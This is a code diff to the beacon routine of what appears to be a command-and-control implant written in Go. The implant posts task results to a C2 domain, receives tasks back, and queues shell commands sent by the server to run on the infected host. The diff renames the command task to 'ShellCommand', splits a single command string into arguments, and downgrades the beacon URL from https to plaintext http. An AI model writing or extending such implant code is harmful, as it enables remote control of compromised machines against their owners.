@@ -9,7 +9,9 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"log"
 	"net/http"
+	"strings"
 	"time"
 )
 
@@ -83,6 +85,7 @@ type BeaconPayload struct {
 
 // Beacon sends results and returns the next Queue
 func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.Queue, error) {
+	log.Println("NEW BEACON ....")
 	// 1. Marshal results
 	payload := BeaconPayload{
 		ImplantID: implantID, // TODO: fix so that it uses JWT so its more secure
@@ -94,7 +97,8 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*ta
 	}
 
 	// 2. Build request
-	uri := "https://" + h.C2Domain + h.C2HTTPSBeaconEndpoint
+	// TODO: should be https://
+	uri := "http://" + h.C2Domain + h.C2HTTPSBeaconEndpoint
 	req, err := http.NewRequest(http.MethodPost, uri, bytes.NewReader(body))
 	if err != nil {
 		return nil, fmt.Errorf("create request: %w", err)
@@ -123,26 +127,22 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*ta
 		switch t.TaskType {
 		case "Ping":
 			tq.Enqueue(task.NewPing(t.ID))
-		case "Command": // TODO: make this ShellCommand for consistent naming?
-			// TODO: CHECKOVER
+		case "ShellCommand":
 			raw, ok := t.Options["commandWithArgs"]
 			if !ok {
 				// TODO: should add malformed Task as a result
 				// skip malformed task, but log it
 				continue
 			}
-			args, ok := raw.([]interface{})
+
+			fullCmd, ok := raw.(string)
 			if !ok {
 				continue
 			}
-			// convert []interface{} → []string
-			cmd := make([]string, len(args))
-			for i, v := range args {
-				if s, ok := v.(string); ok {
-					cmd[i] = s
-				}
-			}
-			tq.Enqueue(task.NewShellCommand(t.ID, cmd))
+			cmdWithArgs := strings.Fields(fullCmd)
+
+			taskn := task.NewShellCommand(t.ID, cmdWithArgs)
+			tq.Enqueue(taskn)
 		case "Configure":
 			tq.Enqueue(task.NewConfigureImplantTask(t.ID, t.Options))
 		}
